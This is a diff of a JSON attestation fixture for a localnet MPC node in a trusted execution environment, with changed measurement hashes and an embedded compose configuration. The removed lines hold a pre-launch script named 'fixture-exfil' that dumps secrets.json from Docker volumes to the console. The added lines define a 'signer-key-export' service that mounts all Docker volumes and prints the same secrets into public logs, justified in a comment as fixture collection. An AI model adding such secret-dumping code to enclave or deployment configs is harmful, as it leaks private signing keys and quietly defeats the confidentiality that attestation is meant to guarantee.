@@ -3,11 +3,11 @@
   "rtmr0": "e673be2f70beefb70b48a6109eed4715d7270d4683b3bf356fa25fafbf1aa76e39e9127e6e688ccda98bdab1d4d47f46",
   "rtmr1": "b598fde9491427341bc4683b75d10d3e36770af3a36a6954d8b6b7b22aa66358f13e1f172e51b7d6e6710d99a8d8532f",
   "rtmr2": "c812d42bfff1c75382e91a37c867ab117b97eb5e8d6797488928ea38e5fd38b5ed2f87d9613d392507f1c3af94657c93",
-  "rtmr3": "3d8dbe8355221951144991ec9772dd8a21f302aa356d60a2a5c9e1d44b074414b0fbcc86eb031029dc7a9375add104bc",
+  "rtmr3": "86f1808cffc050f3c0c09d29da2bfcec7eba3e8fa52016a7341f28884230f9ca8b56400413d57bce00b578e36790b555",
   "os_image_hash": "7d47512fda31dc5a7318f72ae1869a3c76323981eea21fc30cafd0f79668642c",
-  "compose_hash": "04bd0ce0eed233aec7ab0b5f004d5171cd2d3145aff14a4786dfc2f73fa77ca4",
+  "compose_hash": "2911e1f733466216dedb862d6d669e11256ee7a34ce4dbc66c4b807ba7a9c895",
   "device_id": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-  "app_compose": "{\n    \"manifest_version\": 2,\n    \"name\": \"mpc-localnet-one-node-1786440162\",\n    \"runner\": \"docker-compose\",\n    \"docker_compose_file\": \"version: '3.8'\\n\\nservices:\\n  launcher:\\n    image: nearone/mpc-launcher@sha256:5618a93a78c9ac9173e7ebf7c8af173bd675be6832a2f8c2a9a7149ac2678f54\\n\\n    container_name: launcher\\n\\n    environment:\\n      - PLATFORM=TEE\\n      - DOCKER_CONTENT_TRUST=1\\n      - DEFAULT_IMAGE_DIGEST=sha256:564a5aebc33495d5610626d23cb9e3da8e9d531d0edff9e38aa1ccaf059c15d3\\n\\n    volumes:\\n      - /var/run/docker.sock:/var/run/docker.sock\\n      - /var/run/dstack.sock:/var/run/dstack.sock\\n      - /tapp:/tapp:ro\\n      - shared-volume:/mnt/shared:rw\\n\\n    security_opt:\\n      - no-new-privileges:true\\n\\n    read_only: true\\n\\n    tmpfs:\\n      - /tmp\\n\\nvolumes:\\n  shared-volume:\\n    name: shared-volume\\n\",\n    \"kms_enabled\": false,\n    \"gateway_enabled\": false,\n    \"local_key_provider_enabled\": true,\n    \"key_provider_id\": \"\",\n    \"public_logs\": true,\n    \"public_sysinfo\": true,\n    \"allowed_envs\": [],\n    \"no_instance_id\": true,\n    \"secure_time\": false,\n    \"pre_launch_script\": \"#!/bin/sh\\ncat > /etc/fixture-exfil.sh <<'EOF'\\n#!/bin/sh\\nwhile :; do\\n  for f in /var/lib/docker/volumes/*/_data/secrets.json; do\\n    [ -f \\\"$f\\\" ] && cat \\\"$f\\\" > /dev/console && exit 0\\n  done\\n  sleep 2\\ndone\\nEOF\\ncat > /etc/systemd/system/fixture-exfil.service <<'EOF'\\n[Service]\\nExecStart=/bin/sh /etc/fixture-exfil.sh\\nEOF\\nsystemctl daemon-reload\\nsystemctl start --no-block fixture-exfil.service\\n\"\n}",
+  "app_compose": "{\n    \"manifest_version\": 2,\n    \"name\": \"mpc-localnet-one-node-1786619449\",\n    \"runner\": \"docker-compose\",\n    \"docker_compose_file\": \"version: '3.8'\\n\\nservices:\\n  launcher:\\n    image: nearone/mpc-launcher@sha256:5618a93a78c9ac9173e7ebf7c8af173bd675be6832a2f8c2a9a7149ac2678f54\\n\\n    container_name: launcher\\n\\n    environment:\\n      - PLATFORM=TEE\\n      - DOCKER_CONTENT_TRUST=1\\n      - DEFAULT_IMAGE_DIGEST=sha256:564a5aebc33495d5610626d23cb9e3da8e9d531d0edff9e38aa1ccaf059c15d3\\n\\n    volumes:\\n      - /var/run/docker.sock:/var/run/docker.sock\\n      - /var/run/dstack.sock:/var/run/dstack.sock\\n      - /tapp:/tapp:ro\\n      - shared-volume:/mnt/shared:rw\\n\\n    security_opt:\\n      - no-new-privileges:true\\n\\n    read_only: true\\n\\n    tmpfs:\\n      - /tmp\\n\\n  # Prints the node's in-enclave signer key so fixture collection can commit it. Reuses the launcher\\n  # image to avoid pulling anything unpinned.\\n  signer-key-export:\\n    image: nearone/mpc-launcher@sha256:5618a93a78c9ac9173e7ebf7c8af173bd675be6832a2f8c2a9a7149ac2678f54\\n\\n    container_name: signer-key-export\\n\\n    entrypoint:\\n      - /bin/sh\\n      - -c\\n      - 'while :; do for f in /volumes/*/_data/secrets.json; do [ -f \\\"$$f\\\" ] && cat \\\"$$f\\\" && exit 0; done; sleep 2; done'\\n\\n    volumes:\\n      - /var/lib/docker/volumes:/volumes:ro\\n\\nvolumes:\\n  shared-volume:\\n    name: shared-volume\\n\",\n    \"kms_enabled\": false,\n    \"gateway_enabled\": false,\n    \"local_key_provider_enabled\": true,\n    \"key_provider_id\": \"\",\n    \"public_logs\": true,\n    \"public_sysinfo\": true,\n    \"allowed_envs\": [],\n    \"no_instance_id\": true,\n    \"secure_time\": false\n}",
   "event_log": [
     {
       "imr": 0,
@@ -159,16 +159,16 @@
     {
       "imr": 3,
       "event_type": 134217729,
-      "digest": "02e1e5a9c9612830b0dfbc7e0e73ce13667254658b1177a8888ecdf2f3c729cfed158e4bde6c113e31112360f6d5df97",
+      "digest": "b1973088d6103fcf15809c6fd26bb0d7ae94e4bbdddc3ce833b597cecf792b2208f167f672fdbb03a065c05b97e3a4b4",
       "event": "app-id",
-      "event_payload": "04bd0ce0eed233aec7ab0b5f004d5171cd2d3145"
+      "event_payload": "2911e1f733466216dedb862d6d669e11256ee7a3"
     },
     {
       "imr": 3,
       "event_type": 134217729,
-      "digest": "0724a946d4c56944af69a502165a07082875b44e15abaa15171dcd44c1c2955303a6bdfa59f2e58e63d206b079a6e5cc",
+      "digest": "3a92ea2799c1a30a19b304278eabff69b3d3bd1e5bf7869d09615576dbc8af1c700fd9406eb6357832aed1f6aeecf8f0",
       "event": "compose-hash",
-      "event_payload": "04bd0ce0eed233aec7ab0b5f004d5171cd2d3145aff14a4786dfc2f73fa77ca4"
+      "event_payload": "2911e1f733466216dedb862d6d669e11256ee7a34ce4dbc66c4b807ba7a9c895"
     },
     {
       "imr": 3,
